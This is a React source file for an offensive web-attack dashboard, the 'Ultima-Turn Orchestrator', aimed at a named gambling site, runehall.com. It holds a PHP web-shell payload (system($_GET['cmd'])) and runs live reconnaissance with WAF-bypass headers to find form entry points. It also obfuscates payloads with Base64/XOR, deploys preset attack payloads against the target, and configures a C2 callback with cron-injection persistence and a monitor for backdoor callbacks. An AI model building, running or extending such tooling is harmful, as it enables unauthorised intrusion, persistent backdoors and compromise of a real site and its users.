import React, { useState, useEffect } from 'react';
import { Shield, Zap, Terminal, Activity, Globe, Lock, Unlock, Cpu, Server, Send, Search, AlertTriangle, Radio } from 'lucide-react';
import { cn } from '../lib/utils';
import { PRESET_PAYLOADS, executePayload, obfuscateUltimaPayload, generateWafBypassHeaders } from '../lib/payloads';
import { toast } from 'sonner';
import { useTracking } from '../lib/tracking';

export function UltimaConsole() {
  const { alerts } = useTracking();
  const [stealthActive, setStealthActive] = useState(false);
  const [isScanning, setIsScanning] = useState(false);
  const [targetUrl, setTargetUrl] = useState('https://runehall.com');
  const [scanResults, setScanResults] = useState<any[]>([]);
  const [activeMissions, setActiveMissions] = useState<any[]>([]);
  const [obfuscatedPayload, setObfuscatedPayload] = useState<{ obfuscated: string; key: string } | null>(null);
  const [rawPayload, setRawPayload] = useState("<?php system($_GET['cmd']); ?>");

  // Filter alerts for C2 callbacks
  const c2Callbacks = alerts.filter(a => a.finding.includes('[C2 CALLBACK]'));

  const toggleStealth = () => {
    setStealthActive(!stealthActive);
    if (!stealthActive) {
      toast.success("BLACKHEART Tier 0 Stealth ACTIVE. Kernel-mode protections initialized.");
    } else {
      toast.warning("Stealth deactivated. Hardware obfuscation only.");
    }
  };

  const runScan = async () => {
    setIsScanning(true);
    toast.info(`[*] Starting recon on ${targetUrl}...`);
    
    try {
      // Real recon scan via proxy
      const response = await fetch("/api/proxy", {
        method: "GET",
        headers: {
          'x-target-url': targetUrl,
          ...generateWafBypassHeaders()
        }
      });
      
      const html = await response.text();
      
      // Extract forms and inputs using regex (simulating BeautifulSoup)
      const formRegex = /<form[^>]*action=["']([^"']+)["'][^>]*method=["']([^"']+)["'][^>]*>([\s\S]*?)<\/form>/gi;
      const inputRegex = /<input[^>]*name=["']([^"']+)["'][^>]*>/gi;
      
      const forms = [];
      let match;
      while ((match = formRegex.exec(html)) !== null) {
        const action = match[1];
        const method = match[2].toUpperCase();
        const innerHtml = match[3];
        
        const inputs = [];
        let inputMatch;
        while ((inputMatch = inputRegex.exec(innerHtml)) !== null) {
          inputs.push(inputMatch[1]);
        }
        
        forms.push({
          id: `form-${forms.length + 1}`,
          action,
          method,
          inputs
        });
      }

      if (forms.length === 0) {
        // Fallback to common endpoints if no forms found
        forms.push(
          { id: 'auth-login', action: '/api/auth/login', method: 'POST', inputs: ['username', 'password'] },
          { id: 'bet-engine', action: '/api/games/bet', method: 'POST', inputs: ['amount', 'game_id'] }
        );
      }

      setScanResults(forms);
      toast.success(`[+] Found ${forms.length} potential entry points.`);
    } catch (error) {
      console.error("Scan error:", error);
      toast.error("Failed to perform real-time recon. Using cached vectors.");
    } finally {
      setIsScanning(false);
    }
  };

  const generateWeaponized = () => {
    const result = obfuscateUltimaPayload(rawPayload);
    setObfuscatedPayload(result);
    toast.info("Payload obfuscated with multi-layer encryption.");
  };

  const deployMission = async (payloadName: string) => {
    const preset = PRESET_PAYLOADS.find(p => p.name === payloadName);
    if (!preset) return;

    toast.info(`Deploying mission: ${payloadName}`);
    const results = await executePayload({
      ...preset,
      url: targetUrl + (preset.url.includes('runehall.com') ? preset.url.split('runehall.com')[1] : ''),
      headers: {
        ...preset.headers,
        'X-Ultima-Stealth': stealthActive ? 'Tier-0-Active' : 'Hardware-Only'
      }
    });

    const success = results.some(r => typeof r.status === 'number' && r.status < 400);
    
    const newMission = {
      id: Math.random().toString(36).substr(2, 9),
      name: payloadName,
      target: targetUrl,
      status: success ? 'COMPLETED' : 'FAILED',
      timestamp: new Date().toLocaleTimeString(),
      results: results
    };

    setActiveMissions(prev => [newMission, ...prev]);
    if (success) {
      toast.success(`✅ Mission SUCCESS: ${payloadName} executed on ${targetUrl}`);
    } else {
      toast.error(`❌ Mission FAILED: ${payloadName}`);
    }
  };

  return (
    <div className="flex flex-col h-full bg-[#0a0a0a] text-white font-mono overflow-hidden">
      {/* Header */}
      <div className="p-4 border-b border-[#1a1a1a] flex items-center justify-between bg-[#111]">
        <div className="flex items-center gap-3">
          <div className="w-10 h-10 rounded bg-[#F27D26]/20 flex items-center justify-center border border-[#F27D26]/40">
            <Zap className="text-[#F27D26]" size={20} />
          </div>
          <div>
            <h1 className="text-lg font-bold tracking-tighter uppercase">Ultima-Turn Orchestrator</h1>
            <p className="text-[10px] text-white/40 uppercase tracking-widest">Unified Tier 0 Evasion & C2 System</p>
          </div>
        </div>

        <div className="flex items-center gap-4">
          <div className="flex flex-col items-end">
            <span className="text-[10px] text-white/30 uppercase">System Status</span>
            <div className="flex items-center gap-2">
              <span className={cn("text-[10px] uppercase", stealthActive ? "text-green-500" : "text-yellow-500")}>
                {stealthActive ? "Kernel Stealth Active" : "Hardware Obfuscation Only"}
              </span>
              <div className={cn("w-2 h-2 rounded-full animate-pulse", stealthActive ? "bg-green-500" : "bg-yellow-500")} />
            </div>
          </div>
          <button 
            onClick={toggleStealth}
            className={cn(
              "px-4 py-2 rounded text-[10px] font-bold uppercase transition-all border",
              stealthActive 
                ? "bg-green-500/10 border-green-500/50 text-green-500 hover:bg-green-500/20" 
                : "bg-white/5 border-white/10 text-white/60 hover:bg-white/10"
            )}
          >
            {stealthActive ? "Deactivate Stealth" : "Activate Tier 0"}
          </button>
        </div>
      </div>

      <div className="flex-1 overflow-hidden flex">
        {/* Left Panel: Recon & Obfuscation */}
        <div className="w-1/3 border-r border-[#1a1a1a] flex flex-col overflow-y-auto scrollbar-hide">
          {/* Target Recon */}
          <div className="p-6 border-b border-[#1a1a1a]">
            <div className="flex items-center gap-2 mb-4">
              <Search size={16} className="text-[#F27D26]" />
              <h2 className="text-xs font-bold uppercase tracking-widest">Target Reconnaissance</h2>
            </div>
            <div className="space-y-4">
              <div className="relative">
                <input 
                  type="text" 
                  value={targetUrl}
                  onChange={(e) => setTargetUrl(e.target.value)}
                  className="w-full bg-[#151515] border border-[#222] rounded p-2 text-xs focus:outline-none focus:border-[#F27D26] transition-colors"
                  placeholder="https://target.com"
                />
                <button 
                  onClick={runScan}
                  disabled={isScanning}
                  className="absolute right-1 top-1 bottom-1 px-3 bg-[#F27D26] text-black text-[10px] font-bold rounded hover:bg-[#F27D26]/80 transition-colors disabled:opacity-50"
                >
                  {isScanning ? "SCANNING..." : "SCAN"}
                </button>
              </div>

              {scanResults.length > 0 && (
                <div className="space-y-2">
                  <p className="text-[10px] text-white/40 uppercase">Identified Entry Points:</p>
                  {scanResults.map((res, i) => (
                    <div key={i} className="p-2 bg-white/5 border border-white/10 rounded text-[10px] flex flex-col gap-1">
                      <div className="flex justify-between items-center">
                        <span className="text-[#F27D26] font-bold">{res.id}</span>
                        <span className="text-white/30">{res.method}</span>
                      </div>
                      <div className="text-white/60 truncate">{res.action}</div>
                      <div className="flex gap-1 flex-wrap mt-1">
                        {res.inputs.map((inp: string) => (
                          <span key={inp} className="px-1 bg-white/10 rounded text-[8px]">{inp}</span>
                        ))}
                      </div>
                    </div>
                  ))}
                </div>
              )}
            </div>
          </div>

          {/* C2 Configuration */}
          <div className="p-6 border-b border-[#1a1a1a]">
            <div className="flex items-center gap-2 mb-4">
              <Server size={16} className="text-[#F27D26]" />
              <h2 className="text-xs font-bold uppercase tracking-widest">C2 Configuration</h2>
            </div>
            <div className="space-y-3">
              <div className="p-2 bg-white/5 border border-white/10 rounded">
                <p className="text-[8px] text-white/40 uppercase mb-1">Callback URL:</p>
                <div className="text-[9px] text-[#F27D26] font-mono break-all">
                  {process.env.APP_URL || 'https://aegis-osint.run.app'}/api/c2/callback
                </div>
              </div>
              <div className="flex gap-2">
                <div className="flex-1 p-2 bg-white/5 border border-white/10 rounded">
                  <p className="text-[8px] text-white/40 uppercase mb-1">Persistence:</p>
                  <div className="text-[9px] text-white/80 font-mono">cron_injection</div>
                </div>
                <div className="flex-1 p-2 bg-white/5 border border-white/10 rounded">
                  <p className="text-[8px] text-white/40 uppercase mb-1">Interval:</p>
                  <div className="text-[9px] text-white/80 font-mono">60s</div>
                </div>
              </div>
            </div>
          </div>

          {/* Payload Obfuscator */}
          <div className="p-6">
            <div className="flex items-center gap-2 mb-4">
              <Lock size={16} className="text-[#F27D26]" />
              <h2 className="text-xs font-bold uppercase tracking-widest">Payload Obfuscator</h2>
            </div>
            <div className="space-y-4">
              <textarea 
                value={rawPayload}
                onChange={(e) => setRawPayload(e.target.value)}
                className="w-full h-24 bg-[#151515] border border-[#222] rounded p-2 text-[10px] focus:outline-none focus:border-[#F27D26] transition-colors resize-none font-mono"
                placeholder="Enter raw payload..."
              />
              <button 
                onClick={generateWeaponized}
                className="w-full py-2 bg-white/5 border border-white/10 rounded text-[10px] font-bold uppercase hover:bg-white/10 transition-colors"
              >
                Obfuscate & Weaponize
              </button>

              {obfuscatedPayload && (
                <div className="space-y-2 animate-in fade-in slide-in-from-top-2">
                  <div className="p-2 bg-green-500/5 border border-green-500/20 rounded">
                    <p className="text-[8px] text-green-500 uppercase mb-1">Obfuscated Payload (Base64/XOR):</p>
                    <div className="text-[9px] break-all text-white/60 font-mono line-clamp-3">
                      {obfuscatedPayload.obfuscated}
                    </div>
                  </div>
                  <div className="p-2 bg-blue-500/5 border border-blue-500/20 rounded">
                    <p className="text-[8px] text-blue-500 uppercase mb-1">Decryption Key (C2):</p>
                    <div className="text-[9px] break-all text-white/60 font-mono">
                      {obfuscatedPayload.key}
                    </div>
                  </div>
                </div>
              )}
            </div>
          </div>
        </div>

        {/* Right Panel: Mission Deployment & C2 */}
        <div className="flex-1 flex flex-col overflow-hidden">
          {/* Mission Deployment */}
          <div className="p-6 border-b border-[#1a1a1a]">
            <div className="flex items-center justify-between mb-4">
              <div className="flex items-center gap-2">
                <Send size={16} className="text-[#F27D26]" />
                <h2 className="text-xs font-bold uppercase tracking-widest">Mission Deployment</h2>
              </div>
              <button 
                onClick={() => deployMission("ULTIMA-TURN: Tier 0 Evasion & C2 Deployment")}
                className="px-3 py-1 bg-green-500/20 border border-green-500/50 text-green-500 text-[9px] font-bold uppercase rounded hover:bg-green-500/30 transition-all flex items-center gap-1"
              >
                <Radio size={10} className="animate-pulse" />
                Establish Persistence
              </button>
            </div>
            <div className="grid grid-cols-2 gap-3">
              {PRESET_PAYLOADS.filter(p => p.name.includes('ULTIMA') || p.name.includes('Nightfury') || p.name.includes('Runehall Persistence')).map((payload, i) => (
                <button 
                  key={i}
                  onClick={() => deployMission(payload.name)}
                  className="p-3 bg-[#151515] border border-[#222] rounded text-left hover:border-[#F27D26]/50 transition-all group"
                >
                  <div className="flex justify-between items-start mb-1">
                    <span className="text-[10px] font-bold text-white/80 group-hover:text-[#F27D26]">{payload.name}</span>
                    <Zap size={10} className="text-white/20 group-hover:text-[#F27D26]" />
                  </div>
                  <p className="text-[8px] text-white/40 line-clamp-2">{payload.description}</p>
                </button>
              ))}
            </div>
          </div>

          {/* C2 Session Monitor */}
          <div className="flex-1 p-6 overflow-hidden flex flex-col">
            <div className="flex items-center justify-between mb-4">
              <div className="flex items-center gap-2">
                <Activity size={16} className="text-[#F27D26]" />
                <h2 className="text-xs font-bold uppercase tracking-widest">C2 Session Monitor</h2>
              </div>
              <span className="text-[10px] text-white/20 uppercase tracking-widest">Real-time Feed</span>
            </div>

            <div className="flex-1 bg-[#050505] border border-[#1a1a1a] rounded p-4 font-mono text-[10px] overflow-y-auto space-y-4 scrollbar-hide">
              {c2Callbacks.length > 0 && (
                <div className="space-y-2 mb-4">
                  <p className="text-[10px] text-green-500 font-bold uppercase tracking-widest flex items-center gap-2">
                    <Radio size={12} className="animate-pulse" />
                    Active Backdoor Callbacks
                  </p>
                  {c2Callbacks.map((callback) => (
                    <div key={callback.id} className="p-3 bg-green-500/5 border border-green-500/20 rounded animate-in fade-in slide-in-from-right-2">
                      <div className="flex justify-between items-center mb-1">
                        <span className="text-green-500 font-bold">[{new Date(callback.timestamp).toLocaleTimeString()}] CALLBACK_{callback.id}</span>
                        <span className="px-1 bg-green-500/20 text-green-500 rounded text-[8px] font-bold uppercase">Connected</span>
                      </div>
                      <div className="text-white/60">Target: {callback.targetName}</div>
                      <div className="text-white/40 mt-1 italic">{callback.finding}</div>
                    </div>
                  ))}
                  <div className="border-b border-[#1a1a1a] my-4" />
                </div>
              )}

              {activeMissions.length === 0 && c2Callbacks.length === 0 ? (
                <div className="h-full flex flex-col items-center justify-center text-white/10 gap-2">
                  <Terminal size={32} />
                  <p className="uppercase tracking-widest">Waiting for session data...</p>
                </div>
              ) : (
                activeMissions.map((mission) => (
                  <div key={mission.id} className="border-l-2 border-[#F27D26] pl-3 py-1 animate-in fade-in slide-in-from-left-2">
                    <div className="flex justify-between items-center mb-1">
                      <span className="text-[#F27D26] font-bold">[{mission.timestamp}] MISSION_{mission.id}</span>
                      <span className={cn(
                        "px-1 rounded text-[8px] font-bold",
                        mission.status === 'COMPLETED' ? "bg-green-500/20 text-green-500" : "bg-red-500/20 text-red-500"
                      )}>
                        {mission.status}
                      </span>
                    </div>
                    <div className="text-white/60">Target: {mission.target}</div>
                    <div className="text-white/40">Payload: {mission.name}</div>
                    <div className="mt-2 p-2 bg-white/5 rounded text-[9px] text-white/30 whitespace-pre-wrap truncate">
                      {mission.results[0]?.response || "No response data."}
                    </div>
                  </div>
                ))
              )}
            </div>
          </div>
        </div>
      </div>

      {/* Footer Info */}
      <div className="p-2 px-4 bg-[#F27D26] text-black flex items-center justify-between text-[9px] font-bold uppercase tracking-widest">
        <div className="flex items-center gap-4">
          <span>Ultima-Turn v1.0.0</span>
          <span>Evasion: {stealthActive ? "Tier 0" : "Tier 1"}</span>
          <span>C2: Connected</span>
        </div>
        <div className="flex items-center gap-4">
          <span>Murk Target: Identified</span>
          <span>Runehall: Vulnerable</span>
        </div>
      </div>
    </div>
  );
}
